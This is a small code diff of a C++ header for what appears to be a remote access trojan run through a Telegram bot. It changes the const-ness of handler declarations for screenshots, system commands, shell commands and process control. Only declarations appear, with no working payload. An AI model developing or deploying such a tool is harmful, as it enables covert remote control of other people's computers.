@@ -39,13 +39,13 @@ struct Command {
 namespace rat::tbot::handler {
 
 
-std::string _handleScreenshotCommand(const Bot& arg_Bot);
+std::string _handleScreenshotCommand(Bot& arg_Bot);
 
-std::string _parseAndHandleSystemCommand(const Bot& arg_Bot, Message& Telegram_Message);
+std::string _parseAndHandleSystemCommand(Bot& arg_Bot, Message& Telegram_Message);
 
 std::string _parseAndHandleShellCommand(Message& Telegram_Message);
 
-std::string _parseAndHandleProcessCommand(const Bot& bot, Message& Telegram_Message);
+std::string _parseAndHandleProcessCommand(Bot& bot, Message& Telegram_Message);
 
 Command _parseTelegramMessageToCommand(const Message& Telegram_Message);
 
